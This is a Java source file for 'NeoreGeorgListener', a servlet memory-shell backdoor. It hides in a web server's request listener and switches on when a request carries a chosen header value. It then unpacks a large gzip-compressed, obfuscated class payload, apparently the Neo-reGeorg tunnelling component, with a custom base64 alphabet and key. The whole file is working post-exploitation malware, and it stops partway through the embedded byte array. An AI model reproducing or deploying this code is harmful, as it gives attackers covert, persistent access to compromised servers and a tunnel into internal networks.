package jmg.neoregeorg.memshell;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;


/**
 * python3
 * key: key
 * 由 header 来保证变化
 */
public class NeoreGeorgListener implements ServletRequestListener {

    public String headerName;

    public String headerValue;
    public static java.util.Map<String, Object> namespace = new java.util.HashMap();
    String charslist = "yewVGo+BCvNsZrDIiKXMhkq5tFHuA9J/n2jclLdP873bOaYz1QfpTSExW64R0gUm";
    String neoreg_hello = "IwGasXee9x7OudkKMG6QZT0xKxebZGasKG7skTrzHlk2qkvPhS75XP2tKx2VAqLkMk2khcktuMlEJ52e9G7Hq+WxtfgrZE6KCwTaIn==";//7
    byte[] BASE64_ARRAYLIST = new byte[]{-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 6, -1, -1, -1, 31, 60, 48, 33, 42, 58, 23, 57, 41, 40, 29, -1, -1, -1, -1, -1, -1, -1, 28, 7, 8, 14, 54, 25, 4, 26, 15, 30, 17, 37, 19, 10, 44, 39, 49, 59, 53, 52, 62, 3, 56, 18, 46, 12, -1, -1, -1, -1, -1, -1, 45, 43, 35, 38, 1, 50, 61, 20, 16, 34, 21, 36, 63, 32, 5, 51, 22, 13, 11, 24, 27, 9, 2, 55, 0, 47, -1, -1, -1, -1, -1};//3


    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();

        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = getResponseFromRequest(request);
                Object[] args = new Object[]{
                        request, //0
                        response, //1
                        charslist.toCharArray(), //2
                        BASE64_ARRAYLIST,//3
                        new Integer(200),//4
                        new Integer(513),//5
                        new Integer(524288),//6
                        neoreg_hello,//
                        new Integer(1447564139),//8
                        new Integer(0),//9
                        new Integer(0),//10
                        new Integer(0),//11
                };
                if (namespace.get(charslist) == null) {
                    byte[] clazzBytes = unGzip(new byte[]{31, -117, 8, 0, -46, 68, -86, 100, 0, 3, -99, 57, 11, 124, 83, -11, -43, -25, 36, -9, -26, -34, -92, -105, -110, 6, 46, 112, 91, 74, 75, 11, 88, -46, -44, 42, 104, -44, 20, 80, 40, 69, 42, 109, 113, 13, 80, -47, 57, 9, -19, 109, -119, -92, 73, 77, 82, 94, 115, 76, 55, 31, -101, -113, 77, -25, 54, 7, 78, 69, -60, 101, 78, 84, 68, 13, 69, 4, -15, -123, -50, -73, -50, 109, 78, -73, -87, 123, -22, -26, -90, 115, 110, -50, 61, -20, 119, -50, 125, -92, 73, 27, -10, -15, 125, -65, 31, -3, 63, -50, -1, -4, -49, -5, 127, -50, -71, -31, -103, 79, 31, 58, 4, 0, 39, 58, 36, 15, -108, -64, 27, 18, -4, 92, -126, 123, -35, 112, 23, -4, 66, -126, -5, 120, -2, -91, 4, 111, 122, 64, -126, -73, 36, 120, 91, -122, 95, 73, -16, 107, 15, 65, 127, 35, -63, 111, 101, -8, -99, 12, -65, -105, -31, 29, 9, -34, -11, 64, 25, -4, -127, -121, 63, 74, -16, -98, 7, 38, -62, 27, 60, -4, -55, 3, 110, -8, 51, -81, -34, -25, -43, 7, 60, -4, -123, -121, 15, -103, -58, 95, -103, -20, 71, -68, -6, -101, 4, 127, -9, 64, 21, 99, -115, -125, -113, 121, -8, 7, 15, -97, -56, -16, 79, -58, -2, 23, -29, -4, 91, -122, -1, -56, -16, -87, 4, -61, 30, -104, -115, -64, 3, 74, -24, -16, 64, 0, -99, 60, 8, 18, -118, 30, -72, 17, 93, 30, 104, 68, 73, 70, -39, -125, 110, -12, 72, 88, -62, -77, -62, -61, 56, 62, 41, -107, 113, -68, -124, 94, 15, -106, -95, -113, -121, 9, 37, 56, 17, -43, 18, -100, -124, -109, 121, -104, 34, -93, 70, -36, -80, -100, 73, 86, -16, 48, -107, -73, -107, 60, 76, 35, 89, -80, -54, -125, -43, 56, -99, 6, 18, -111, -122, 79, 24, -91, -90, 4, 107, 113, 70, 9, -50, 68, 85, -58, 89, -116, 117, -100, -116, 117, 124, 50, 91, 70, 63, -49, -11, 60, 4, 120, 104, -112, -15, 120, 9, 27, 61, -80, -110, 76, -124, 39, -32, -119, -76, -62, 57, -68, 125, 95, -58, -71, 100, 17, 60, -119, 9, -100, 44, 99, 80, -58, 83, 120, 127, -86, 7, 98, 120, 26, 15, 33, 9, -101, 60, -80, 22, -25, 121, 112, 62, 46, 96, -56, -23, -28, 33, 60, -125, -39, 47, -108, 113, -111, -116, -51, 50, 46, -26, 93, -117, -124, 75, 8, 9, 62, -31, -51, -103, 50, 46, -11, 96, 43, -98, -59, 55, -106, -15, -86, -51, -125, -19, -40, -63, -100, -105, -53, 120, 54, 67, 62, -61, 67, 39, 15, 97, -58, 90, 33, -31, 74, 15, 108, 97, 47, 110, -63, 85, 50, 118, -15, 124, -114, -116, -85, 25, -8, 62, 95, 60, -105, -121, -13, 100, -4, 44, 75, 123, 62, 15, -97, 99, -105, 92, -32, -127, -85, 112, 77, 9, -100, -122, 17, 30, -42, 74, -40, -51, -112, 30, 9, 117, 9, 123, 61, 112, 13, -10, 49, -18, 58, 9, -93, 30, -72, -114, 99, -29, 58, -68, -112, -121, -11, 108, -31, 24, 15, -3, 60, -60, 37, 76, 80, 64, -30, 0, -69, -12, 34, 55, -103, 33, 41, 97, -54, 13, 55, -15, -100, 118, -61, -51, -104, 100, -76, 65, 62, -34, -32, -63, -115, -72, -119, -121, -51, 60, 108, -111, -16, -13, 30, -40, -59, -78, -17, -62, -117, 121, -8, -126, -124, 91, 37, -4, -94, 7, -18, -92, 0, -57, 75, 36, -68, 84, -62, 47, 33, 56, -12, 56, 13, -25, 53, -45, -48, -93, -13, 106, 17, -126, -100, -46, 83, -87, 104, 34, -98, 66, 24, -33, 118, 97, 100, 67, -92, 113, 48, 29, -115, 53, -74, 71, 6, -102, 16, -36, -31, 104, 95, 60, -110, 30, 76, 18, -10, -55, -123, -89, -13, -52, 109, 44, 18, -17, 107, 12, -89, -109, -47, 120, 95, 83, 30, 100, -7, -38, 11, -11, -18, 116, -45, 2, -94, -31, -102, 23, -115, 71, -45, 11, 16, -100, 117, -77, 87, 33, 8, -51, 9, -26, -19, -46, 47, 26, -116, -60, -120, -87, 90, 55, -10, -38, -20, 115, 17, -60, -75, -63, -109, 88, -36, 73, 117, -25, 45, -102, 61, -106, -105, -119, -64, -108, 38, -43, -115, 61, -99, -51, -102, -71, -41, -23, -111, 30, 61, -71, 94, -33, -116, 48, -85, 24, 82, 49, -86, -98, -106, 77, -35, -6, 64, -38, 52, -120, 20, 77, -59, 18, -35, -111, -40, 40, 41, -19, -5, 36, -91, 103, 109, 108, -61, 5, 61, 122, -73, -95, -109, -97, 68, -51, 67, 107, -115, -89, -11, 62, 61, 73, -62, -116, -43, -48, -70, -87, -57, 115, 55, -57, -30, 20, 37, 69, 122, 41, -47, -8, -122, -60, 122, -67, 93, 79, -81, 75, -12, 32, 44, 43, 98, -64, -79, -62, 22, -95, 63, -69, -104, 88, -29, -14, -119, -49, 65, 56, -1, -1, 76, -67, 57, 22, 73, -91, -114, -103, -97, 59, 25, -119, -9, 44, -38, -100, -42, -55, -36, -82, -70, -42, 86, 67, 67, -49, 90, 6, -84, 72, -112, -38, -28, 103, 14, -128, 86, 2, 70, -29, -23, 21, 9, 11, 85, -84, 51, 49, 93, 27, -12, 100, -76, -105, 28, -36, 88, -60, 65, 6, 100, 83, 99, 92, 79, 55, -90, 82, -79, -58, 112, -72, 45, 108, -58, -70, -31, 58, 95, -9, 58, -67, 123, 125, 115, 44, -86, 19, -35, -28, 96, 42, -83, -109, 49, 67, -74, 35, 82, 122, -9, 96, 50, -102, -34, -36, -40, -83, 39, -45, -115, -25, -100, 124, -62, 105, -51, -76, -120, -10, 70, -69, 35, 105, -67, -120, 5, 102, -81, -110, -16, -53, 54, -47, -80, -98, 36, -71, 114, 68, 125, 125, 122, 122, 97, 55, -121, -107, -34, -45, -102, 74, 13, -22, 73, -46, -32, -72, -70, -39, -57, -60, -118, 94, -24, -68, -18, -104, -15, -124, 20, -56, -62, 62, -124, 9, 69, 108, -85, -64, 61, 112, -81, 2, 123, -32, 62, -124, -78, 49, 113, -93, -32, 101, 120, 57, -126, 119, -76, -44, 100, 126, 18, -83, -117, -104, -21, -55, -126, 99, -109, -86, 2, 79, -61, 15, 17, 74, 13, 120, 52, -47, 104, 35, 2, -31, -46, -67, -26, 4, 81, -113, -89, -37, -12, 120, 95, 122, 29, -95, 17, -88, 53, 62, 48, -104, 38, -38, 122, -92, -97, -28, -76, -17, -27, 65, 21, -68, 2, 47, 87, -16, 74, 120, 17, 97, -14, 104, 113, 22, 13, 70, 99, 61, 44, -19, 87, -16, -85, -92, 43, 94, -91, -32, -43, 120, -115, -126, -41, -30, -41, 20, -4, 58, -33, -69, 22, -81, 83, -32, 32, 28, 82, -16, 122, -4, -122, 2, 79, -64, -109, 54, 27, -125, 76, -18, -19, 42, 120, 3, 126, 83, -63, 111, -63, 62, 5, -65, -51, 54, 19, 86, 116, -82, 108, 81, -16, 70, -4, -114, 2, -113, -63, -29, 20, 64, 73, 61, -91, -89, 77, 3, -40, 47, 73, 49, 40, 113, -72, -84, -20, 108, 99, 1, -120, -60, 54, -36, -114, 80, -98, 59, 88, -102, 78, 15, -48, 33, -87, 30, 39, 3, 25, -100, 110, 98, -76, -17, -30, -51, 8, -43, -123, -15, -58, -72, -87, 81, -56, -73, -64, 67, 10, -34, -118, 59, 40, 27, 82, 56, 74, 120, -101, -126, 59, -15, 118, -117, -61, -56, 85, 35, 116, -38, 35, -15, -120, -31, -68, 93, 120, -121, -126, -33, -61, -116, -126, -33, -57, 59, 77, 67, 47, 53, 82, 91, 71, -92, -97, 31, -125, 106, -120, 103, 36, -26, -106, -8, 96, -65, -98, -116, 48, 51, 9, 127, -96, -32, 93, -72, 91, -63, -69, -15, 30, 9, -17, 85, 112, 15, -34, 39, -31, 94, 5, -17, -57, 7, 20, 124, 16, -77, -90, -10, 38, 41, 5, 30, -127, -61, 10, -18, -61, 33, 5, -9, -29, 67, 10, 28, -127, -89, 20, 56, 0, 15, 43, 120, 0, 31, -106, -16, 32, -101, -108, -20, -2, 8, 30, -106, -16, 81, 5, 31, -61, -57, 37, 124, -126, -124, -79, -94, -96, -63, 12, 3, 5, -97, 100, -21, -106, -83, -96, 103, -99, -22, -43, -109, 13, 45, -100, -31, -56, -73, 10, 30, -127, -61, -60, 48, -107, 99, -120, 79, -111, 71, -31, 29, 124, 90, -63, 31, -30, -45, -26, 81, 56, 77, -59, -122, 52, -86, -76, 67, -121, -97, -5, -62, 100, 50, -78, 121, -7, 96, 58, 23, 68, 18, 62, -93, -32, -77, -8, 28, -117, 116, 21, 93, -116, -12, -12, -40, 52, -81, -90, 0, -63, -25, -15, 26, -124, 18, -61, -63, -117, 6, 123, 123, 57, 100, -91, -26, -27, 29, 29, 45, -51, 43, 20, 124, -127, 66, 0, 95, -60, -105, 20, 124, 25, 95, -55, 119, 109, 43, 13, -31, 68, -9, 122, 122, -85, 61, 61, 116, 57, -59, 17, -16, 35, 9, 95, 85, -16, -57, -8, 19, 5, 127, -118, -81, 41, -80, 23, -18, 87, -16, 103, -8, 58, 21, -49, -27, -53, 40, -84, -106, 44, 108, 109, -93, -44, -76, -72, 53, -100, 99, -16, 6, -2, 28, -95, -54, 36, 75, 26, 116, -81, -117, -112, -5, 99, -87, 70, -109, 118, -77, -71, 85, -16, 23, -116, 38, 116, -74, 44, 92, 44, -31, 47, 21, 124, 19, -33, -94, 103, -127, 111, 43, -8, 43, 54, -9, -81, 21, -4, 13, -2, 86, -63, -33, -31, -61, 36, -4, -110, -27, -99, 93, 11, 59, 23, 51, -25, -33, 43, -8, 14, 31, -68, -53, 62, -68, 1, -33, -90, -6, 55, -10, 25, -79, -50, -4, -118, -2, 64, 98, -50, -97, -49, -85, 63, 34, -32, 124, 86, -24, 61, -66, -11, 30, -19, 26, 20, -4, 19, -2, 89, -63, -9, -7, -123, 125, -64, -61, 95, -16, 67, 5, -1, -54, 116, 63, -30, -40, -48, 114, -106, -23, -48, -45, 27, 19, -55, -11, -100, 76, -110, -67, -111, 110, 93, -63, -65, -31, -121, 8, 19, 11, 76, 103, 25, -51, -114, 70, 27, 124, -110, 109, 76, -4, 59, -15, -128, -3, -16, 16, -62, -44, 49, -34, 45, -56, 16, 87, 26, 25, 2, 63, 86, -32, 5, 120, 81, -127, -25, -32, 121, 5, 94, -126, -105, -87, 63, 25, 85, 100, 20, -4, 7, 126, -94, -32, 63, -15, 95, 10, -2, 27, -1, 99, 103, 42, 3, -95, 45, -63, -23, 45, -17, 70, 120, 93, 34, 73, 25, -19, 25, 120, 86, -127, 79, -15, 83, 9, -121, 21, 7, -112, -78, 14, -60, -101, 21, -121, -61, -31, -76, 19, -96, -15, -114, 58, -87, 42, 37, -6, 21, -121, -32, 16, 21, -121, -117, -93, -84, -26, 127, -49, -43, 118, -22, 53, 40, 44, -115, -92, -42, 81, -101, 68, -63, -47, -95, 39, -110, -6, -103, 52, -112, 64, -45, 70, -91, -120, 68, 42, 29, -89, 71, -68, -118, -85, 88, -108, 3, 117, 20, 2, 115, -56, 79, 6, 84, 55, -118, -56, -111, 39, 67, 46, 5, 82, -35, -96, -126, -71, 42, 18, 27, -44, -115, -42, -85, -107, 31, -54, -122, 72, 52, 22, 89, 27, 35, -120, 64, -74, -90, -108, -25, -118, 12, 12, -24, 113, 90, 52, 28, 83, -125, 100, 101, -24, 38, -85, 42, 83, 59, 39, -89, 19, 118, 45, -103, 88, 87, -76, -93, 114, -89, 6, -41, -90, 44, -108, 73, 92, -31, -117, 33, -71, 98, 86, 21, 81, -21, -118, 35, 72, 27, 88, -109, -27, -67, 6, -115, 124, 12, -69, 53, 34, -111, 54, 114, 125, 58, 74, -81, 70, -94, -118, -67, -79, -63, 20, -79, 16, -69, 99, -119, 20, -31, -71, -69, 19, -3, 3, -111, -92, -66, 34, 113, -108, 59, 100, -78, -46, 4, -103, 103, 36, -127, 83, -66, -80, -107, -76, -54, -60, -56, 25, 73, -32, -91, -116, -45, 73, -115, -83, -98, -54, -43, -108, 18, 2, 45, 78, -104, -39, -117, -84, 94, 119, 46, 75, -30, -119, -90, 90, -29, -87, 116, 36, -34, 77, 98, 76, -32, -108, 56, 38, 14, 106, -21, 70, 117, 47, -93, 81, 12, -107, -90, 20, -30, 80, 73, 49, -46, -15, 38, 98, 85, 98, -108, 99, -101, -55, -15, 71, 117, 111, -79, -37, -92, -118, -64, 29, 7, 66, -105, -43, 15, -115, 96, 45, -45, 55, 91, -79, -40, 52, -6, 40, 63, 80, -101, 70, -11, 54, 97, 94, -24, -26, -77, 50, 68, -25, 14, -62, 76, -119, 75, 34, -35, -23, 68, -110, 122, -72, -102, -70, 34, 34, 21, -32, 52, -103, -26, 26, 13, 46, 98, -82, 49, 55, -103, 103, 94, -95, 108, 78, -60, 98, -90, -33, 40, 101, 9, -79, 104, 42, 61, 98, -92, -47, -107, -44, 126, 8, 6, -36, -56, 87, 109, -124, -49, 65, -103, -44, -87, -49, -29, 88, -102, -112, 127, -43, 56, 101, 126, -91, -123, 48, 126, -110, 105, -90, -103, 72, 114, 24, -25, 83, 109, -75, -32, 68, -44, 55, 22, 74, -100, -42, 69, 82, 29, -122, 95, -23, 41, 83, -13, 42, -60, -115, 77, -31, -109, -53, 53, -43, -66, -111, 56, 60, 59, 73, 17, -100, 76, 111, -26, -122, -13, 40, 29, -14, -104, -121, 50, -98, 92, -109, 95, 111, 41, -50, 108, 62, -108, -76, -13, 79, -72, 59, 37, 100, -85, 41, 23, -22, -116, -98, 124, 98, 49, 76, 82, -127, 50, 6, -67, 126, -117, -66, 89, -80, -105, 68, -11, 88, 15, -35, 44, 43, 48, -122, -7, -19, 57, -82, 0, 64, 41, -126, 62, -28, -62, -36, -78, 21, 34, 19, -88, 16, -39, -64, -15, -102, -97, -105, -83, 125, 113, -54, -67, -51, 17, 118, 81, 105, 33, 87, 83, -116, 78, 61, 53, 64, 33, -96, -101, 31, -91, -109, -13, -44, -52, 43, 73, 77, -26, -27, -106, 100, 50, -111, -76, -75, -55, -17, -91, 55, 83, -101, -33, -49, -23, -107, 67, -93, 59, 49, -80, -103, 63, -24, -58, -6, -91, -75, 8, -56, -80, -121, 64, -90, -89, -5, 50, 37, -93, -108, 110, 124, -13, 8, -100, 118, 56, -86, -19, 100, 115, -44, 70, -126, 115, 103, -54, 0, 112, 16, -26, -27, 38, 19, -85, -87, -8, -9, -79, -23, -122, 81, -72, -28, -94, 110, 51, -101, 81, -119, -82, 27, 77, -55, -86, -29, -26, -43, 50, 66, -20, -115, -10, -47, -117, 94, 68, 31, -56, -21, -115, -36, 94, 71, -71, -83, -104, -76, 58, -65, 51, 46, 58, 35, 18, 59, -115, 100, 120, -22, 127, -1, -76, -4, 111, 95, -115, -50, 62, 22, 119, 86, 17, 2, 69, -47, 93, 73, -67, 63, -79, 65, -73, -65, 21, -30, 86, -21, 97, 55, -121, 114, 36, -58, -97, -7, 92, 59, -90, -28, -118, 75, 33, 82, 19, 31, 21, 61, -32, 42, 33, 26, -98, -49, 89, -108, 17, 44, -46, 84, 107, -12, 72, 50, -33, 53, -71, 67, 34, 89, -110, 78, -28, 90, 32, 106, -72, 70, 126, -23, 24, -61, 92, -24, -115, 69, -23, 13, 40, -108, 6, 58, -11, -2, 8, 37, 103, 54, 121, 69, 93, 115, -79, 26, 109, -35, 9, 28, 99, 73, -73, 89, -44, 25, -82, 21, 83, 3, 49, -50, -4, -59, -46, 69, -63, 47, 25, -71, -46, 76, 90, -84, -92, 46, 34, 105, 62, 51, -87, -49, 44, 103, -108, 7, 104, 53, -70, 117, 76, -79, -102, -7, -49, 55, 63, -51, -110, 1, 73, -65, 118, 122, -79, 45, 49, -67, -97, 62, 42, 8, -69, -124, 19, -99, -75, 53, -117, 70, 94, -77, -55, -28, 74, 45, 126, -71, -2, -45, -54, 51, -83, 102, 106, 50, 26, -59, 60, -5, -113, 116, -113, 92, -81, -93, -87, -123, -87, 20, -1, -60, 69, -31, -71, 36, -103, -24, -25, -116, 58, 6, -49, -56, -73, 43, 86, -97, -35, 66, 113, 95, -124, -56, 25, 69, 12, 53, -10, -9, -112, 124, -10, 73, -67, -105, -33, 68, -93, -39, 35, 52, 89, 101, -68, -40, 25, -1, -40, -109, -30, -97, 14, 72, 74, -93, 109, 27, -105, 50, 127, 74, -80, -9, 46, -13, -25, 26, -124, -45, -118, -68, -123, 99, -3, 13, 70, 98, 27, -101, 121, -89, -50, 48, -100, -101, 1, 70, 82, -121, -23, 112, 23, -108, -128, 3, 118, -61, -35, -32, -92, -7, 30, -72, 23, -128, -26, 61, 112, 31, -51, 110, -2, 32, 2, -124, 7, 12, -40, -125, -32, -93, 117, 22, -10, -47, 56, 68, -112, 50, -102, -111, 102, -47, 79, 16, 70, -25, 95, 14, -24, 11, -64, 60, 118, -67, 5, 46, 56, -114, -26, -117, -21, 15, -125, -125, -2, -75, 7, -100, 115, 58, 2, -62, -100, -112, -32, 15, -120, 115, 14, -125, -109, -2, 61, 8, -76, 113, -47, 70, -92, 127, 15, -126, 43, 32, -47, 90, -54, -126, 28, 20, 3, -78, -67, 116, 5, -68, 46, 123, 45, 5, -68, -116, -30, 14, -55, 1, 111, 14, -63, 29, -16, -70, -19, -75, 39, -32, -11, -40, -21, -110, -128, -73, -60, 94, 43, 66, 112, -100, 24, 44, 117, 5, -57, 75, 65, -81, 28, 44, -13, -70, -126, 62, -81, 20, -100, 64, -21, -119, 94, 119, 80, -43, 4, -97, -57, 121, 16, 74, -122, 64, 57, 12, -29, 66, -109, -68, 117, -76, 9, 77, 54, -89, 41, -66, -46, -112, 70, 127, -27, 13, -66, -15, 57, 36, -55, -92, -20, -72, 21, -18, -94, -93, -118, 6, -97, 55, 119, 84, 22, -102, -86, 77, -51, -126, 47, 88, -87, 86, 58, 118, -128, 43, 3, -89, -88, -107, 15, -53, -95, 105, -38, 84, 109, 90, 22, 38, -104, -80, -38, 3, 48, 113, -11, 62, 80, -75, -118, 44, 76, 58, 0, -18, -43, -38, -76, 125, 48, -103, -42, 89, -104, 18, -86, -56, 12, 63, -94, 122, -124, 29, 16, -46, 42, -100, 106, 73, 22, -76, -112, -90, 85, 48, 106, -71, -86, -12, 24, 51, -61, -54, -75, 10, 62, -84, 8, -47, -111, -45, 62, -27, -125, 10, 63, -17, -90, -122, 42, -75, 74, -43, 61, 4, -107, 67, 48, 45, 52, 57, 99, 32, 78, -30, -109, -22, 44, 76, -41, -120, 83, 13, 15, -75, -50, -35, -38, 100, 117, -94, 97, 88, 34, 116, -60, 113, 5, 109, 85, 99, 75, -118, -8, 102, 100, 97, -26, 54, 80, 12, -118, -77, -74, 59, -94, -116, -117, 97, 70, -95, 81, -16, 29, 103, -23, -35, -43, -32, -85, -53, -103, -64, 29, -86, 60, 0, -77, 87, 107, 21, -5, -64, 79, 122, -109, -42, 20, 6, -127, 80, -107, 86, -91, 85, 102, -95, 65, -85, 18, -78, 112, -68, -81, 81, -85, -54, -62, 9, -37, -128, -26, -61, -48, -24, -49, -62, -119, -66, 57, 67, 48, 55, 84, -83, 85, -93, 112, 16, 78, 90, -19, -12, -121, 49, 11, 39, 27, -57, 26, -55, 28, -52, -62, 41, 13, -66, 83, 115, 108, 78, 99, -44, 33, 8, -123, -90, 107, -45, -121, -96, 73, -101, -66, 31, -26, 33, -124, 106, -76, -102, -3, 48, 31, 97, 27, -52, -31, -43, 2, 4, -106, -88, -74, -63, 119, 58, 81, 45, 89, -19, -44, 106, -61, -106, -108, 51, 72, -96, -38, 33, 56, 67, 35, 37, 23, 102, -122, -97, 41, -18, -31, 21, 44, -25, -94, 80, 77, 6, -92, 16, 25, -53, 118, -100, 70, -50, -14, -109, 29, 76, 3, 55, 103, 97, 49, 1, -76, 114, -53, -123, -75, 90, 109, 22, 90, -120, 67, -115, 54, -61, -87, -51, 56, -108, -123, 37, 90, 77, 22, -50, -28, 97, 41, 19, 108, -35, 15, 103, -15, -117, 89, 86, 32, -15, 89, -7, 18, 107, -75, 71, 32, -88, -43, -6, -38, -78, -48, -66, 29, 2, -76, -22, 48, 86, 53, 44, 118, 22, -106, 19, 117, -63, 119, -74, 104, 43, -75, 90, -48, 102, -80, 102, 93, -103, -31, -67, -52, -31, 51, 101, 120, -35, 78, 24, -57, -53, 78, -106, 126, 38, -81, -62, -52, -20, 41, -48, -24, -26, 10, -45, 28, -86, 72, 10, 24, -9, -100, -69, -53, 4, -96, 72, -99, 113, 0, 86, -110, -118, -85, 66, 51, 89, 122, 10, -39, -43, -63, 90, -78, -61, 52, -75, -106, 14, 103, -79, 62, -77, -100, 42, -39, -83, 75, -101, -87, -51, -54, -62, 57, -103, -31, -41, -75, -103, 89, 88, 77, 103, -126, -17, 92, 83, 30, 95, 27, -53, 67, -89, -27, 67, 112, -98, 65, 125, -124, -93, 33, -100, -51, -108, 34, -110, -80, 62, 59, 58, 34, 5, -33, -7, 118, 100, 21, 19, -107, -20, 94, 106, -121, -24, 17, -4, -104, -74, -29, -115, 109, 37, 69, -20, -25, 40, 98, -73, 3, 7, -86, -49, -128, 77, -93, -43, 4, 94, 13, -63, 5, -63, -86, 33, 88, -61, 97, -109, -123, -56, 1, 88, 75, -81, 78, -83, -38, 7, -35, 101, 37, 67, 89, -24, -47, -86, -99, 89, -48, -69, -10, 66, -81, 86, -87, 85, -17, -121, 62, 39, -87, 56, 69, -11, -6, -42, -123, 51, -104, 34, 58, -68, -114, -122, 105, 42, -29, -104, -82, 38, -24, -7, -60, -17, 66, -125, 95, -125, 113, 109, 63, -84, 119, -112, -13, 98, 102, -44, 71, -78, -48, -97, 1, 49, 84, 101, -99, -59, 29, -48, -107, -63, -39, 116, 39, 97, -36, -71, 107, -52, -99, 35, -80, 81, 117, 13, -63, 0, -67, -107, 105, 108, -90, -117, -126, -43, -86, 20, -100, -18, 12, -42, -40, 62, -87, 85, -85, 111, -127, 78, -75, -102, -3, -60, 24, 73, -118, 46, -89, 90, -51, -34, -88, 101, 103, -99, -61, -64, 84, -105, 90, -93, 86, -81, 9, -46, -96, -70, 110, 3, 15, -19, -90, -33, 6, 94, -110, 124, 28, 71, 78, 58, -100, -127, -15, 57, 6, -103, -31, 123, 109, 45, 97, 18, 49, -50, -45, -78, -54, -48, 18, 54, -110, -60, -125, -122, -60, -3, -93, 37, -98, -84, -114, -77, 50, 56, 63, -17, 67, 44, 58, 89, -105, 47, 110, -24, 98, 43, 111, 52, -58, 77, -37, -96, -108, -8, -47, 106, 51, 69, -25, 7, 57, 118, -45, -118, -80, -77, 13, -89, -47, -21, -102, 82, -16, -70, -14, 34, 36, 3, 85, -102, -111, 54, -3, -102, 76, -103, -50, 72, -99, 5, -57, 66, -69, 115, 55, 21, -73, 103, -15, 42, -68, 22, -86, 28, 79, 56, -98, 117, -68, 0, 85, -62, 22, -31, 41, -31, 25, -102, 63, 17, 81, 20, -96, 74, 108, 16, -17, 22, -9, -48, -4, -90, 107, -86, -85, 10, -86, -88, -120, -19, 114, 109, -122, 42, -68, -61, -15, 50, -49, -114, 87, -100, 119, -13, -20, -68, 71, 8, -14, 44, -100, -30, -38, -64, -77, 81, -19, 14, -64, -61, 102, -75, -61, 73, 32, -126, 76, -77, -25, 0, 108, 33, 39, 125, -66, -67, -2, -48, 2, 103, 80, 80, -123, -54, -99, -16, 81, -67, 42, 92, 38, -32, -36, 50, 24, -34, 26, 20, 9, -76, 3, -22, 3, -2, 7, 64, 80, 69, -15, -30, -109, -78, 112, 113, -105, -75, 115, 109, -107, 54, -103, 123, -33, 23, -78, -80, -75, 43, 3, -5, -13, -81, -70, -116, -85, 45, 71, -67, -86, -70, -54, -32, -125, -83, -46, -59, -105, -28, 29, -72, -68, -29, -73, -118, 54, -47, 47, -102, 68, 123, -14, -119, 74, -1, 15, 114, -86, 84, 6, -121, -73, 122, 93, 5, 71, -110, -9, -12, -83, -58, 54, 51, -84, 4, -78, 112, -55, 30, -85, 35, 56, 8, -121, 44, 27, -7, 64, 0, 15, -51, -82, 122, -54, -117, -19, -127, 67, 11, 56, -96, 43, -9, -63, -91, 33, -63, 73, 118, 17, -55, 84, -17, 16, 41, 87, 64, 21, 47, 19, 113, -18, 92, 82, -104, 97, 110, -43, -27, -72, 117, -8, 93, 26, -115, -78, -7, 100, 1, -118, 100, -95, 72, 6, -118, 100, -94, -20, -44, 72, 82, 22, -45, 123, 2, -53, -97, -123, 47, 89, -8, 65, 89, -107, -67, -13, 119, -128, 91, -93, -14, -109, -34, -61, -108, 84, -103, -95, 38, 17, 74, -11, -61, -81, -47, 104, 16, 57, 95, 99, -99, -58, -77, 33, 100, -17, -68, -83, 98, 1, 29, -73, -22, 30, 77, -57, -51, 80, -109, -114, -37, -96, -29, 54, -23, 80, 107, -95, -54, 46, -78, -42, 38, -43, -51, 36, 50, -61, 83, -52, 91, -122, 125, 100, -2, 97, -98, -102, 43, 110, -88, 82, 100, 31, 23, -51, 125, -66, -46, 54, -65, -17, -53, 89, -72, -116, -115, 100, 71, -47, -46, -128, 74, -51, -109, 104, -43, -98, 122, -82, 52, -94, -109, 8, 81, 17, -70, -36, -40, -48, -70, -62, 44, 61, 109, 121, 72, 76, -57, -128, -111, -57, 51, -61, 67, -11, 78, 2, -106, 11, -36, 35, -104, 2, 60, 74, 127, 2, 57, -120, 3, -6, 49, 120, -36, 18, 101, 61, 117, -125, 18, -51, 23, 112, 17, -81, -89, 26, -98, -123, 43, -38, -121, -32, -54, -114, -122, -3, -16, 21, -82, 82, 103, -46, -30, -85, 92, -92, -82, 10, 9, -84, -50, -43, 33, 81, 19, -83, -77, 58, 94, 25, -121, -41, -124, 92, -102, -21, 81, -72, 118, 27, -108, 105, -82, 44, 124, -115, -30, -30, -21, -37, 64, 20, 118, 103, -122, 95, -51, 12, 103, -23, 125, 22, -118, -32, -26, -1, -13, -79, -38, -53, 107, -23, 69, 81, -76, -64, -91, 70, 15, -42, -18, 92, -32, 63, 20, 20, 36, -54, 121, -82, 3, 112, -35, 106, -22, 57, -81, 15, 73, -107, -86, -80, 19, 34, 26, 85, -23, 111, 4, 69, 77, -46, 92, 78, -51, 69, 117, -10, -122, 46, -115, 50, -24, 55, 73, 83, -71, -121, 93, 78, -105, -36, 116, -22, 118, 106, 110, -29, -76, -110, 96, 107, -42, 44, 80, 69, 97, 23, 53, 76, -94, -41, 125, 59, 76, 32, -49, 26, 61, -104, -101, 18, 9, -91, 37, 55, -19, 53, 119, 56, 51, 124, 107, -64, -76, -109, -101, -1, -53, -60, 18, -19, 106, 18, -105, -83, -77, -47, -17, -108, -67, 19, -121, -32, 91, 97, -65, -9, 56, 107, 101, 37, 105, -110, -73, -46, 127, 104, 39, 116, -6, 43, -25, 28, -127, 37, 52, -78, -99, 30, 5, -9, 54, -54, -63, 2, 85, 34, 110, 13, -60, 12, -43, 102, -63, -54, -99, 98, -96, -110, 3, 76, 19, 15, -79, -36, 107, -122, -32, -37, -108, -55, 105, -53, -43, -107, -114, 93, -105, 57, -55, 127, -9, 4, -116, -56, 65, -24, -124, 62, -72, -48, 112, -102, -101, -1, 27, -49, 114, 91, -52, -118, -96, 53, -127, 67, 7, -31, -58, 14, 35, 116, 2, 36, -59, 50, -114, -99, 44, 124, 39, 36, -6, 36, -90, -72, 109, 27, -108, 